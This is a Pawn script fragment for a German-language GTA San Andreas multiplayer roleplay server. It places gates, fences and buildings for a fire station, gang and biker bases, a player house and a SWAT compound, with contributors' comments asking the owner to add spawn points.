	tor[89]=CreateDynamicObject(5422,1749.70,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[90]=CreateDynamicObject(5422,1760.90,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[91]=CreateDynamicObject(5422,1766.70,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[92]=CreateDynamicObject(5422,1778.30,-1094.90,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[93]=CreateDynamicObject(5422,1784.10,-1094.90,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[94]=CreateDynamicObject(5422,1795.40,-1094.90,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[95]=CreateDynamicObject(5422,1801.10,-1094.90,25.10, 0.00,0.00,90.00);//Feuerwehrtor








CreateObject(18267, -559.7587,-1089.3591,60.1717+1, 0, 0, 348.3195+180);



yakutor = CreateObject(980, 2518.82227, 1822.89758, 12.60578,   0.00000, 0.00000, 89.52004);


CreateDynamicObject(980, 2518.89819, 1834.33203, 12.60578,   0.00000, 0.00000, 89.52004);
CreateDynamicObject(980, 2518.97681, 1845.89795, 12.60578,   0.00000, 0.00000, 89.52004);
CreateDynamicObject(980, 2524.59766, 1851.78101, 12.60578,   0.00000, 0.00000, 0.18004);
CreateDynamicObject(980, 2535.60718, 1851.80737, 12.60578,   0.00000, 0.00000, 0.18004);
CreateDynamicObject(980, 2518.61133, 1811.33899, 12.60578,   0.00000, 0.00000, 89.52004);
CreateDynamicObject(980, 2518.53882, 1799.81409, 12.60578,   0.00000, 0.00000, 89.52004);
CreateDynamicObject(980, 2524.06885, 1793.95813, 12.60578,   0.00000, 0.00000, 177.66002);
CreateDynamicObject(980, 2535.37720, 1793.46460, 12.60578,   0.00000, 0.00000, 177.66002);
CreateDynamicObject(980, 2560.03394, 1725.16516, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.89966, 1713.76929, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.87695, 1702.92419, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.79395, 1691.59827, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.73218, 1680.37036, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.61377, 1669.01147, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2559.48828, 1658.51221, 12.60578,   0.00000, 0.00000, 89.64003);
CreateDynamicObject(980, 2565.04028, 1652.47424, 12.60578,   0.00000, 0.00000, 177.00012);
CreateDynamicObject(980, 2576.38721, 1651.79529, 12.60578,   0.00000, 0.00000, 177.00012);



terrorgate631 = CreateObject(980, 785.31372, -1152.43372, 25.40322,   0.00000, 0.00000, -87.84000);


terrotgate772 = CreateObject(980, 664.93164, -1309.73682, 15.22011,   0.00000, 0.00000, 0.00000);


terrorgate532 = CreateObject(980, 660.07465, -1227.42554, 16.92300,   0.00000, 0.00000, 64.55999);


CreateObject(980, 668.26404, -1215.40710, 18.84896,   0.00000, 0.00000, -122.76001);



Textdraw0 = TextDrawCreate(609.199951, 147.348815, "usebox");
TextDrawLetterSize(Textdraw0, 0.000000, 17.160865);
TextDrawTextSize(Textdraw0, 498.799987, 0.000000);
TextDrawAlignment(Textdraw0, 1);
TextDrawColor(Textdraw0, 0);
TextDrawUseBox(Textdraw0, true);
TextDrawBoxColor(Textdraw0, 102);
TextDrawSetShadow(Textdraw0, 0);
TextDrawSetOutline(Textdraw0, 0);
TextDrawFont(Textdraw0, 0);

Textdraw1 = TextDrawCreate(526.399658, 151.822128, "Support Tickets");
TextDrawLetterSize(Textdraw1, 0.195599, 1.375998);
TextDrawAlignment(Textdraw1, 1);
TextDrawColor(Textdraw1, -1);
TextDrawSetShadow(Textdraw1, 0);
TextDrawSetOutline(Textdraw1, 1);
TextDrawBackgroundColor(Textdraw1, 51);
TextDrawFont(Textdraw1, 1);
TextDrawSetProportional(Textdraw1, 1);

Textdraw2 = TextDrawCreate(506.000000, 177.208709, "Spieler: Mister_Moreno ID: 25");
TextDrawLetterSize(Textdraw2, 0.183999, 1.156978);
TextDrawAlignment(Textdraw2, 1);
TextDrawColor(Textdraw2, -1);
TextDrawSetShadow(Textdraw2, 0);
TextDrawSetOutline(Textdraw2, 1);
TextDrawBackgroundColor(Textdraw2, 51);
TextDrawFont(Textdraw2, 1);
TextDrawSetProportional(Textdraw2, 1);

Textdraw3 = TextDrawCreate(504.800018, 163.271194, "-----------------------------------------------");
TextDrawLetterSize(Textdraw3, 0.135996, 1.475553);
TextDrawAlignment(Textdraw3, 1);
TextDrawColor(Textdraw3, -1);
TextDrawSetShadow(Textdraw3, 0);
TextDrawSetOutline(Textdraw3, 1);
TextDrawBackgroundColor(Textdraw3, 51);
TextDrawFont(Textdraw3, 1);
TextDrawSetProportional(Textdraw3, 1);

Textdraw4 = TextDrawCreate(509.600067, 281.244415, "Verwende /ar ID");
TextDrawLetterSize(Textdraw4, 0.294799, 1.346132);
TextDrawAlignment(Textdraw4, 1);
TextDrawColor(Textdraw4, -1);
TextDrawSetShadow(Textdraw4, 0);
TextDrawSetOutline(Textdraw4, 1);
TextDrawBackgroundColor(Textdraw4, 51);
TextDrawFont(Textdraw4, 1);
TextDrawSetProportional(Textdraw4, 1);








// SF Rifa Base

	CreateDynamicObject(987, -1858.17, 451.59, 34.15,   0.00, 0.00, 66.48);
	CreateDynamicObject(987, -1865.84, 442.47, 34.16,   0.00, 0.00, 51.77);
	CreateDynamicObject(987, -1874.13, 433.79, 34.16,   0.00, 0.00, 47.05);
	CreateDynamicObject(987, -1882.91, 425.81, 34.16,   0.00, 0.00, 42.36);
	CreateDynamicObject(987, -1894.52, 423.40, 34.16,   0.00, 0.00, 12.55);
	CreateDynamicObject(987, -1906.01, 419.94, 34.16,   0.00, 0.00, 18.78);
	CreateDynamicObject(987, -1917.95, 419.20, 34.16,   0.00, 0.00, 5.30);
	CreateDynamicObject(987, -1902.82, 511.34, 34.16,   0.00, 0.00, 178.36);
	CreateDynamicObject(987, -1924.60, 512.00, 34.16,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -1979.34, 413.52, 34.16,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -1990.92, 413.80, 34.16,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -1990.78, 425.79, 34.16,   0.00, 0.00, 271.39);
	CreateDynamicObject(987, -1991.01, 437.81, 34.16,   0.00, 0.00, 271.24);
	CreateDynamicObject(987, -1990.82, 449.64, 34.16,   0.00, 0.00, 269.78);
	CreateDynamicObject(987, -1990.79, 461.47, 34.16,   0.00, 0.00, 269.92);
	CreateDynamicObject(987, -1990.56, 473.10, 34.16,   0.00, 0.00, 268.31);
	CreateDynamicObject(987, -1990.61, 485.15, 32.86,   0.00, 0.00, 270.11);
	CreateDynamicObject(987, -1990.68, 496.99, 34.16,   0.00, 0.00, 272.80);
	CreateDynamicObject(987, -1990.28, 508.90, 34.16,   0.00, 0.00, 269.41);
	CreateDynamicObject(987, -1989.68, 520.33, 34.16,   0.00, 0.00, 268.74);
	CreateDynamicObject(987, -1989.66, 532.11, 34.16,   0.00, 0.00, 270.41);
	CreateDynamicObject(987, -1989.76, 538.17, 34.16,   0.00, 0.00, 271.10);
	CreateDynamicObject(19356, -1982.68, 489.51, 29.87,   0.00, 0.00, 269.30);
	CreateDynamicObject(19386, -1901.86, 486.16, 32.22,   0.00, 0.00, 0.00); // Bitte 1 Meter über diesen Koordinaten den Spawn für die SF Rifa Base machen

// Krangamer Haus

	CreateDynamicObject(19383, 1616.70, -1498.45, 14.78,   0.00, 0.00, 0.00);
	CreateDynamicObject(1502, 1616.63, -1497.71, 13.23,   0.00, 0.00, 269.82);
	CreateDynamicObject(987, 1646.44, -1532.26, 12.55,   0.00, 0.00, 84.75);   // Hallo, ich habe mir auch noch ein Haus erstellt bitte packe das auch auf den Server :)
	CreateDynamicObject(987, 1644.63, -1544.07, 12.56,   0.00, 0.00, 82.80);
	CreateDynamicObject(987, 1644.20, -1555.52, 12.56,   0.00, 0.00, 87.24);
	CreateDynamicObject(987, 1610.99, -1451.21, 12.34,   0.00, 0.00, 180.28);
	CreateDynamicObject(987, 1465.82, -1489.94, 12.54,   0.00, 0.00, 266.63);
	CreateDynamicObject(987, 1464.93, -1501.79, 12.54,   0.00, 0.00, 266.22);
	CreateDynamicObject(987, 1561.80, -1567.32, 12.56,   0.00, 0.00, 1.17);










// Biker Base Interior

	CreateObject(18783, -2643.98, 502.30, 1233.15,   -180.58, 0.00, 0.00);
	CreateObject(18783, -2641.19, 502.77, 1224.74,   0.00, 0.00, 0.00);
	CreateObject(18783, -2641.04, 485.80, 1224.82,   0.00, 0.00, 0.00);
	CreateObject(19386, -11846.41, -2160.39, -2120.44,   0.00, 0.00, 0.00);
	CreateObject(19386, -2650.22, 492.79, 1228.95,   0.00, 0.00, 0.00);
	CreateObject(1502, -2650.24, 493.54, 1227.32,   0.00, 0.00, 269.01);
	CreateObject(19356, -2650.45, 498.98, 1228.87,   0.00, 0.00, 0.00);
	CreateObject(19356, -2650.27, 495.87, 1228.87,   0.00, 0.00, 0.00);
	CreateObject(19356, -2649.60, 507.62, 1228.87,   0.00, 0.00, 323.25);
	CreateObject(19356, -2650.41, 501.81, 1228.87,   0.00, 0.00, 0.00);
	CreateObject(19356, -2650.48, 504.78, 1228.87,   0.00, 0.00, 0.00);
	CreateObject(19356, -2647.36, 509.88, 1228.86,   0.00, 0.00, 308.84);
	CreateObject(1760, -2649.87, 502.20, 1227.23,   0.00, 0.00, 88.51);
	CreateObject(1760, -2649.86, 499.34, 1227.23,   0.00, 0.00, 90.46);
	CreateObject(19360, -2641.20, 501.99, 1228.56,   0.00, 0.00, 0.00);
	CreateObject(2700, -2641.58, 502.37, 1229.89,   0.00, 0.00, 181.31);
	CreateObject(19356, -2644.67, 511.19, 1228.85,   0.00, 0.00, 283.36);
	CreateObject(19356, -2636.66, 510.83, 1228.85,   0.00, 0.00, 0.07);
	CreateObject(19356, -2641.61, 511.78, 1228.85,   0.00, 0.00, 276.55);
	CreateObject(19356, -2646.30, 488.51, 1228.94,   0.00, 0.00, 63.29);
	CreateObject(19356, -2649.00, 490.22, 1228.94,   0.00, 0.00, 51.77);
	CreateObject(19356, -2637.94, 511.63, 1228.85,   0.00, 0.00, 255.69);
	CreateObject(19356, -2638.64, 511.85, 1228.77,   0.00, 0.00, 273.56);
	CreateObject(19356, -2636.57, 507.71, 1228.85,   0.00, 0.00, 0.07);
	CreateObject(19356, -2636.65, 504.70, 1228.85,   0.00, 0.00, 0.07);
	CreateObject(19356, -2636.79, 501.56, 1228.85,   0.00, 0.00, 358.03);
	CreateObject(18783, -2644.18, 496.15, 1233.23,   -180.58, 0.00, 0.00);
	CreateObject(19356, -2643.53, 487.66, 1229.04,   0.00, 0.00, 84.77);
	CreateObject(19356, -2640.65, 488.10, 1229.04,   0.00, 0.00, 109.80);
	CreateObject(19356, -2636.39, 498.77, 1228.85,   0.00, 0.00, 15.90);
	CreateObject(19356, -2638.02, 489.61, 1229.04,   0.00, 0.00, 129.98);
	CreateObject(19356, -2635.95, 491.88, 1229.04,   0.00, 0.00, 144.71);
	CreateObject(19356, -2635.54, 495.76, 1228.85,   0.00, 0.00, 15.90);
	CreateObject(19356, -2635.31, 493.86, 1229.04,   0.00, 0.00, 168.23); // Habe ein Interior für die Biker Base erstellt Die Koordinaten wo sie drinnen Spawnen sollen sind folgende : -2648.96, 492.62, 1227.32,   0.00, 0.00, 0.00);
																				// Und wenn sie draussen Spawnen Hier : -2624.46, 1411.65, 6.09,   0.00, 0.00, 0.00);

//










/*
	new lspdscheisse1 = CreateObject(4163, 1469.33594, -1732.28906, 12.47940,   0.00000, 0.00000, 0.00000);
    SetObjectMaterial(lspdscheisse1, 3, 6322, "law2_roadsb", "rodeo3sjm", 0);


	new lspdscheisse2 = CreateObject(4148, 1427.05469, -1662.28906, 12.46900,   0.00000, 0.00000, 0.00000);// Hier
    SetObjectMaterial(lspdscheisse2, 2, 6322, "law2_roadsb", "rodeo3sjm", 0);


	new lspdscheisse3 = CreateObject(3994, 1479.55469, -1592.28906, 12.47311,   0.00000, 0.00000, 0.00000);
    SetObjectMaterial(lspdscheisse3, 3, 6322, "law2_roadsb", "rodeo3sjm", 0);

	new lspdscheisse4 = CreateObject(4150, 1532.05469, -1662.28906, 12.46509,   0.00000, 0.00000, 0.00000);
    SetObjectMaterial(lspdscheisse4, 2, 6322, "law2_roadsb", "rodeo3sjm", 0);
*/


	CreateDynamicObject(987, -2659.50, 1306.06, 6.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -2647.45, 1305.85, 6.14,   0.00, 0.00, 28.97);
	CreateDynamicObject(987, -2637.15, 1311.66, 6.18,   0.00, 0.00, 36.29);
	CreateDynamicObject(987, -2627.61, 1318.51, 6.18,   0.00, 0.00, 41.64);
	CreateDynamicObject(987, -2618.79, 1326.01, 6.18,   0.00, 0.00, 44.84);
	CreateDynamicObject(987, -2610.31, 1334.05, 6.18,   0.00, 0.00, 44.95);
	CreateDynamicObject(987, -2601.34, 1342.40, 6.19,   0.00, 0.00, 84.83);
	CreateDynamicObject(987, -2596.92, 1363.47, 6.19,   0.00, 0.00, 90.61);
	CreateDynamicObject(987, -2596.85, 1375.44, 6.12,   0.00, 0.00, 120.59);
	CreateDynamicObject(987, -2613.39, 1406.68, 6.10,   0.00, 0.00, 37.23);
	CreateDynamicObject(987, -2606.68, 1397.41, 6.11,   0.00, 0.00, 125.88);
	CreateDynamicObject(987, -2602.44, 1386.14, 6.12,   0.00, 0.00, 111.39);
	CreateDynamicObject(987, -2722.33, 1367.78, 6.18,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -2733.94, 1368.03, 6.29,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -2733.95, 1368.43, 0.61,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -2603.95, 1413.80, 6.47,   0.00, 0.00, 39.96);
	CreateDynamicObject(4100, -2592.67, 1422.58, 5.96,   0.00, 0.00, 0.00);
	CreateDynamicObject(4100, -2592.88, 1422.66, 3.43,   0.00, 0.00, 0.00);
	CreateDynamicObject(4100, -2593.07, 1422.73, 1.09,   0.00, 0.00, 0.00);
	CreateDynamicObject(4100, -2592.76, 1422.72, 8.42,   0.00, 0.00, 0.00);
	CreateDynamicObject(13645, -2613.27, 1354.80, 6.96,   0.00, 0.00, 281.29); // Bitte erstelle dort noch einen Spawn
	CreateDynamicObject(18771, -2625.28, 1410.40, -27.24,   0.00, 0.00, 4.11);
	CreateDynamicObject(13645, -2624.38, 1412.38, 23.30,   0.00, 0.00, 0.00);






// SWAT
CreateDynamicObject(8661, 2801.98950, 848.17279, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.98779, 848.17279, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.98535, 848.17279, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.96143, 868.15649, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.95557, 868.15649, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.95337, 868.15649, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2777.55518, 925.28461, 9.65921,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8661, 2801.92529, 888.13971, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.92554, 888.14172, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.92139, 888.14172, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, 2777.68408, 947.26270, 19.52180,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2777.64380, 965.01752, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 995.53900, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.62769, 1008.00250, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2792.41455, 1022.74988, 10.93520,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2822.94531, 1022.74988, 10.93520,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2853.48071, 1022.74988, 10.93520,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2879.79224, 1022.74988, 10.93520,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2894.54858, 1007.98462, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 977.45349, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 946.92932, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 916.41132, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 885.86902, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 855.34229, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 848.52863, 10.93520,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2879.78857, 833.78522, 10.93520,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2849.24512, 833.78522, 10.93520,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2818.69604, 833.78522, 10.93520,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2792.42529, 833.78522, 10.93520,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2777.64380, 861.65088, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 892.16138, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2822.94531, 1022.74988, 13.21180,   180.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2822.94531, 1022.74988, 15.46510,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2777.64380, 934.47400, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 934.47400, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 965.01752, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 995.53900, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 1007.99060, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2792.41455, 1022.74988, 13.21180,   180.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2853.48071, 1022.74988, 13.21180,   180.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2879.79224, 1022.74988, 13.21180,   180.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2894.54858, 1007.98462, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 977.45349, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 946.92932, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 916.41132, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 885.86902, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 855.34229, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 848.54858, 13.21180,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2879.80859, 833.78522, 13.21180,   180.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2849.24512, 833.78522, 13.21180,   180.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2818.69604, 833.78522, 13.21180,   180.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2792.40601, 833.78522, 13.21180,   180.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2777.64380, 861.65088, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 848.54858, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 892.16138, 13.21180,   180.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 934.47400, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 965.01752, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 995.53900, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 1007.99060, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2792.41455, 1022.74988, 15.46510,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2853.48071, 1022.74988, 15.46510,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2879.79224, 1022.74988, 15.46510,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8656, 2894.54858, 1007.98462, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 977.45349, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 946.92932, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 916.41132, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 885.86902, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 848.52863, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2894.54858, 855.34229, 15.46510,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8656, 2879.78857, 833.78522, 15.46510,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2849.24512, 833.78522, 15.46510,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2818.69604, 833.78522, 15.46510,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2792.41211, 833.78522, 15.46510,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8656, 2777.64380, 848.54858, 10.93520,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 848.54858, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 861.65088, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8656, 2777.64380, 892.16138, 15.46510,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8210, 2777.68408, 995.39130, 19.52180,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8210, 2805.16797, 1022.75537, 19.52180,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8210, 2860.67163, 1022.75537, 19.52180,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8210, 2894.48657, 995.21295, 19.52180,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8210, 2867.13159, 1022.75537, 19.52180,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(8210, 2894.48657, 939.85968, 19.52180,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8210, 2894.48657, 884.36462, 19.52180,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8210, 2894.48657, 861.16241, 19.52180,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8210, 2866.96582, 833.80560, 19.52180,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, 2811.42871, 833.80560, 19.52180,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, 2805.10889, 833.80560, 19.52180,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8210, 2777.68408, 861.28632, 19.52180,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8210, 2777.68408, 879.49768, 19.52180,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(9254, 2806.45557, 851.30957, 10.36240,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(9241, 2864.89136, 856.05389, 11.46370,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19447, 2813.73804, 868.20752, 9.62330,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19447, 2823.36768, 868.20752, 9.62330,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19447, 2830.22778, 868.20752, 9.62330,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19447, 2834.96582, 863.46527, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19447, 2834.96582, 853.84473, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19447, 2834.96582, 844.21252, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19355, 2834.96582, 837.78271, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19428, 2834.96582, 835.41052, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19428, 2834.96582, 834.09369, 9.62330,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(9244, 2791.76636, 982.74591, 14.89800,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8661, 2801.90771, 908.11987, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.88379, 908.11987, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.87280, 908.11987, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.87842, 928.10309, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.87427, 928.10309, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.87329, 928.10309, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.85034, 948.08319, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.83594, 948.08319, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.82568, 948.08319, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.85034, 968.05573, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.81836, 988.02728, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2801.81836, 1008.00909, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.83594, 968.05573, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.79590, 988.02728, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2841.80396, 1008.00909, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.82568, 968.05573, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.78564, 988.02728, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 2881.76978, 1008.00909, 9.75480,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3624, 2855.66162, 1003.05322, 14.11030,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(12929, 2787.84399, 948.67371, 9.72780,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3279, 2784.68213, 886.52295, 9.75140,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 2784.68213, 1015.73828, 9.75140,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3077, 2784.41162, 945.30072, 9.70910,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(9243, 2879.30322, 910.39783, 14.72000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16093, 2819.82031, 1007.83832, 13.81750,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16638, 2819.91772, 1006.87598, 12.04650,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3397, 2819.67749, 1006.46942, 13.94230,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3077, 2819.86572, 1004.83514, 9.70130,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3787, 2790.88135, 942.68109, 10.28370,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3383, 2790.81812, 946.78632, 9.75280,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3383, 2790.83301, 949.77832, 9.75280,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1252, 2790.89258, 942.64850, 10.91050,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(2035, 2790.85254, 950.85962, 10.80660,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2035, 2790.85254, 949.86041, 10.80660,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2035, 2790.85254, 948.87952, 10.80660,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2036, 2790.85254, 947.25372, 10.80660,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2036, 2790.85254, 946.05170, 10.80660,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2048, 2787.80420, 940.68591, 13.59210,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(18044, 2863.77856, 1013.62488, 11.45260,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(19447, 2849.40576, 1006.32550, 10.11790,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19355, 2863.18311, 1006.32550, 10.61790,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19355, 2866.38281, 1006.32550, 10.61790,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19428, 2860.78711, 1006.32550, 10.61790,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19428, 2843.96826, 1006.32550, 10.11790,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3077, 2857.29810, 1016.09601, 9.72190,   0.00000, 0.00000, 0.00000);
